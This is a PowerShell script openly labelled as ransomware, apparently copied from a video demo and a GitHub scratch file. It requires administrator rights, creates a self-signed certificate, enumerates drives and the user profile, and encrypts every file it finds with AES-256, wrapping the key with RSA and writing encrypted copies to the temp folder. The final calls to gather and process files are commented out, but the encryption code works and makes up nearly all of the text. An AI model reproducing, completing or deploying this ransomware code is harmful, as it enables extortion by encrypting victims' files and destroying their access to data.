# Copy created 10/26/2020
# Source original script found here https://youtu.be/atL1WmmMJJw
# Source secondary script https://github.com/mcc85sx/FightingEntropy/blob/master/scratch/2020_0912-Ransomware(1).ps1

Class RansomwareFileItem
{
    [String]       $Mode
    [DateTime]     $Date
    [Int32]       $Depth
    [String]       $Name
    [String]   $FullName
    RansomwareFileItem([String]$Fullname)
    {
        If (![System.IO.File]::Exists($Fullname))
        {
            Throw "Invalid Path"
        }

        Write-Host "Processing [+] $Fullname"

        $This.Fullname       = $Fullname
        $This.Main()
    }
    Main()
    {
        $File          = [System.IO.FileInfo]::New($This.Fullname)

        $This.Mode     = $File.Mode
        $This.Date     = $File.LastWriteTime
        $This.Depth    = $File.FullName.Split("\").Count - 2
        $This.Name     = $File.Name
    }
    [String] ToString()
    {
        Return "<Ransomware.File[Item]>"
    }
}

Class RansomwareCryptoItem
{
    [UInt32]            $Index
    [String]           $Source
    [String]           $Target
    [Object]     $StreamWriter
    [Object]        $Transform
    [Object]     $CryptoStream
    [Object]     $StreamReader
    [Int32]            $XCount
    [Int32]            $Offset
    [Int32]    $BlockSizeBytes
    [Byte[]]             $Data
    [Int32]         $BytesRead
    RansomwareCryptoItem([UInt32]$Index,[String]$Source,[String]$Target)
    {
        $This.Index  = $Index
        $This.Source = $Source
        $This.Target = $Target
    }
    [String] ToString()
    {
        Return "<Ransomware.Crypto[Item]>"
    }
}

Class RansomwareProvider
{
    [String]         $Path
    [Object]  $Certificate
    [Object]  $AesProvider
    [Object] $KeyFormatter
    [Byte[]]  $KeyExchange
    [Int32]     $KeyLength
    [Byte[]]          $Key
    [Int32]      $IVLength
    [Byte[]]           $IV
    [Object]       $Output
    RansomwareProvider([String]$Path,[Object]$Certificate)
    {
        If (![System.IO.Directory]::Exists($Path))
        {
            Throw "Invalid path"
        }

        $This.Path         = $Path
        $This.Certificate  = $This.GetCertificate($Certificate)
        $This.AesProvider  = $This.GetAesProvider()
        $This.KeyFormatter = $This.GetKeyExchangeFormatter()
        $This.KeyExchange  = $This.KeyFormatter.CreateKeyExchange($This.AesProvider.Key,$This.AesProvider.GetType())
        $This.KeyLength    = $This.KeyExchange.Length
        $This.Key          = [System.BitConverter]::GetBytes($This.KeyLength)
        $This.IVLength     = $This.AesProvider.IV.Length
        $This.IV           = [System.BitConverter]::GetBytes($This.IVLength)

        $This.Clear()
    }
    Clear()
    {
        $This.Output       = @( )
    }
    [Object] GetCertificate([Object]$Certificate)
    {
        Return [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
    }
    [Object] GetAesProvider()
    {
        $Item              = [System.Security.Cryptography.AesManaged]::New()
        $Item.KeySize      = 256
        $Item.BlockSize    = 128
        $Item.Mode         = [System.Security.Cryptography.CipherMode]::CBC

        Return $Item
    }
    [Object] GetKeyExchangeFormatter()
    {
        Return [System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter]::New($This.Certificate.PublicKey.Key)
    }
    [Object] RansomwareCryptoItem([UInt32]$Index,[String]$Source,[String]$Target)
    {
        Return [RansomwareCryptoItem]::New($Index,$Source,$Target)
    }
    ProcessFile([Object]$File)
    {        
        $xTarget = $File.Fullname -Replace ($File.FullName.Split("\")[0]), $This.Path
        $Parent  = Split-Path $xTarget
        If (![System.IO.Directory]::Exists($Parent))
        {
            [System.IO.Directory]::CreateDirectory($Parent)
        }
        
        $Crypt   = $This.RansomwareCryptoItem($This.Output.Count,$File.Fullname,$xTarget)
        
        $Crypt.StreamWriter = $This.GetFileStream($Crypt.Target,"Create")
        $Crypt.StreamWriter.Write($This.Key,0,4)
        $Crypt.StreamWriter.Write($This.IV,0,4)
        $Crypt.StreamWriter.Write($This.KeyExchange,0,$This.KeyLength)
        $Crypt.StreamWriter.Write($This.AesProvider.IV,0,$This.IVLength)
        
        $Crypt.Transform      = $This.AesProvider.CreateEncryptor()
        $Crypt.CryptoStream   = $This.GetCryptoStream($Crypt.StreamWriter,$Crypt.Transform,"Write")
        
        $Crypt.XCount         = 0
        $Crypt.Offset         = 0
        $Crypt.BlockSizeBytes = $This.AesProvider.BlockSize/8
        $Crypt.Data           = [Byte[]]::New($Crypt.BlockSizeBytes)
        $Crypt.BytesRead      = 0
        
        Try
        {
            $Crypt.StreamReader   = $This.GetFileStream($Crypt.Source,"Open") 
        
            Do
            {
                $Crypt.XCount     = $Crypt.StreamReader.Read($Crypt.Data,0,$Crypt.BlockSizeBytes)
                $Crypt.Offset    += $Crypt.XCount
                $Crypt.CryptoStream.Write($Crypt.Data,0,$Crypt.XCount)
                $Crypt.BytesRead += $Crypt.BlockSizeBytes
            }
            While ($Crypt.XCount -gt 0)
        
            $Crypt.CryptoStream.FlushFinalBlock()
            $Crypt.CryptoStream.Close()
            $Crypt.StreamReader.Close()
        }
        Catch
        {

        }

        $Crypt.StreamWriter.Close()
        
        $This.Output         += $Crypt
    }
    [Object] GetFileStream([String]$Fullname,[String]$Mode)
    {
        $xMode = [System.IO.FileMode]::$Mode

        Return [System.IO.FileStream]::New($Fullname,$xMode)
    }
    [Object] GetCryptoStream([Object]$Stream,[Object]$Transform,[String]$Mode)
    {
        $xMode = [System.Security.Cryptography.CryptoStreamMode]::$Mode

        Return [System.Security.Cryptography.CryptoStream]::New($Stream,$Transform,$xMode)
    }
    [String] ToString()
    {
        Return "<Ransomware.Provider>"
    }
}

Class RansomwareDriveItem
{
    [UInt32]       $Index
    [Object]        $Name
    [String]    $Provider
    [Int32]         $Mode
    [String]        $Root
    [String] $DisplayRoot
    [String] $Description
    RansomwareDriveItem([Object]$Drive)
    {
        $This.Name                = $Drive.Name
        $This.Provider            = Split-Path -Leaf $Drive.Provider.ToString()
        $This.SetMode()

        $This.Root                = $Drive.Root
        $This.DisplayRoot         = $Drive.DisplayRoot
        $This.SetDescription($Drive)
    }
    SetDescription([Object]$Drive)
    {
        If (!$Drive.Description)
        { 
            $Item = "-" 
        }
        Else
        { 
            $Item = $Drive.Description
        }

        $This.Description = $Item
    }
    SetMode()
    {
        $Item = Switch ($This.Provider)
        { 
            FileSystem   {0} Certificate  {1} Environment  {2} Registry     {3} Temp         {4} 
            Alias        {5} Function     {6} Variable     {7} WSMan        {8} Default     {-1} 
        }

        $This.Mode = $Item
    }
    [Object] GetChildItem()
    {
        Return Get-ChildItem $This.Root -Recurse
    }
    [String] ToString()
    {
        Return "<Ransomware.Drive[Item]>"
    }
}

Class RansomwareDriveList
{
    [Object] $Output
    RansomwareDriveList()
    {
        $This.Refresh()
    }
    Clear()
    {
        $This.Output = @( )
    }
    Refresh()
    {
        $This.Clear()

        $List = Get-PSDrive | % { $This.RansomwareDriveItem($_) } | Sort-Object Mode

        ForEach ($X in 0..9)
        {
            ForEach ($Drive in $List | ? Mode -eq $X | Sort-Object Name)
            {            
                $Drive.Index  = $This.Output.Count
                $This.Output += $Drive
            }
        }
    }
    [Object] RansomwareDriveItem([Object]$Drive)
    {
        Return [RansomwareDriveItem]::New($Drive)
    }
    [String] ToString()
    {
        Return "<Ransomware.Drive[List]>"
    }
}

Class RansomwareProgress
{
    [UInt32]  $Index
    [UInt32]   $Rank
    [String] $Status
    RansomwareProgress([UInt32]$Index,[UInt32]$Step)
    {
        $This.Index  = $Index
        $This.Rank   = $Index * $Step
        $This.Status = "{0:p}" -f ($Index/100)
    }
    [String] ToString()
    {
        Return $This.Status
    }
}

Class RansomwareHostController
{
    [String]        $Name
    [String]         $Dns
    [String]     $NetBios
    [UInt32]    $IsDomain
    [String]    $Hostname
    [String]    $Username
    [Object]   $Principal
    [Bool]       $IsAdmin
    [Object] $Certificate
    [Object]    $Provider
    [Object]       $Drive
    [Object]     $Profile
    [Object]     $Content
    RansomwareHostController()
    {
        $This.Name        = $This.GetName()
        $This.Dns         = $This.GetDnsName()
        $This.NetBios     = $This.GetNetBiosName()
        $This.IsDomain    = $This.PartOfDomain()
        $This.Hostname    = $This.GetHostName()
        $This.Username    = $This.GetUsername()
        $This.Principal   = $This.GetPrincipal()
        $This.IsAdmin     = $This.Principal.IsInRole("Administrator") -or $This.Principal.IsInRole("Administrators")
        
        If ($This.IsAdmin -eq 0)
        {
            Throw "Must run as administrator"
        }

        $This.Certificate = $This.GetCertificate()
        $This.Provider    = $This.RansomwareProvider()
        $This.Drive       = $This.RansomwareDriveList()

        # $This.GetProfile()
        # $This.GetContent()
    }
    [Object] GetCertificate()
    {
        Return New-SelfSignedCertificate -CertStoreLocation Cert:\LocalMachine\My -DnsName $This.HostName
    }
    [Object] RansomwareProvider()
    {
        Return [RansomwareProvider]::New($Env:Temp,$This.Certificate)
    }
    [Object] RansomwareProvider([String]$Path)
    {
        Return [RansomwareProvider]::New($Path,$This.Certificate)
    }
    [Object] RansomwareDriveList()
    {
        Return [RansomwareDriveList]::New()
    }
    [Object] RansomwareFileItem([String]$Path)
    {
        Return [RansomwareFileItem]::New($Path)
    }
    [String] GetName()
    {
        Return [Environment]::GetEnvironmentVariable("ComputerName") | % ToLower
    }
    [String] GetDnsName()
    {
        Return [Environment]::GetEnvironmentVariable("UserDNSDomain") | % ToLower
    }
    [String] GetNetBiosName()
    {
        Return [Environment]::GetEnvironmentVariable("UserDomain") | % ToLower
    }
    [String] GetUsername()
    {
        Return [Environment]::GetEnvironmentVariable("Username") | % ToLower
    }
    [UInt32] PartOfDomain()
    {
        Return Get-CimInstance Win32_ComputerSystem | % PartOfDomain
    }
    [Object] GetPrincipal()
    {
        Return [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    }
    [String] GetHostname()
    {
        $Item = Switch ($This.IsDomain)
        {
            0 { $This.Name } 1 { "{0}.{1}" -f $This.Name, $This.Dns }
        }

        Return $Item
    }
    GetProfile()
    {
        $xProfile = [Environment]::GetEnvironmentVariable("UserProfile")

        $This.Profile = Get-ChildItem $xProfile | % { $_.FullName }
    }
    GetContent()
    {
        $Hash = @{ }
        
        ForEach ($Item in Get-ChildItem $This.Profile -Recurse | ? PsIsContainer -eq $False)
        {
            $Hash.Add($Hash.Count,$This.RansomwareFileItem($Item.FullName))
        }

        $This.Content = $Hash[0..($Hash.Count-1)]
    }
    [Object] RansomwareProgress([UInt32]$Index,[UInt32]$Step)
    {
        Return [RansomwareProgress]::New($Index,$Step)
    }
    ProcessAll()
    {
        $Step          = [Math]::Round($This.Content.Count/100)
        $Slot          = 0..100 | % { $This.RansomwareProgress($_,$Step) }
        $Slot[-1].Rank = $This.Content.Count

        $C             = 0

        Write-Progress -Activity "Processing File(s)" -Status $Slot[$C].Status -PercentComplete 0

        ForEach ($X in 0..($This.Content.Count-1))
        {
            $File = $This.Content[$X]

            If ($X -in $Slot.Rank)
            {
                $C ++
                Write-Progress -Activity "Processing File(s)" -Status $Slot[$C].Status -PercentComplete $C
            }

            $This.Provider.ProcessFile($File)
        }

        Write-Progress -Activity "Processing File(s)" -Status Complete -Completed
    }
    [String] ToString()
    {
        Return "<Ransomware.Host[Controller]>"
    }
}

$Ctrl = [RansomwareHostController]::New()

# $Ctrl.GetProfile()
# $Ctrl.GetContent()
# $Ctrl.ProcessAll()
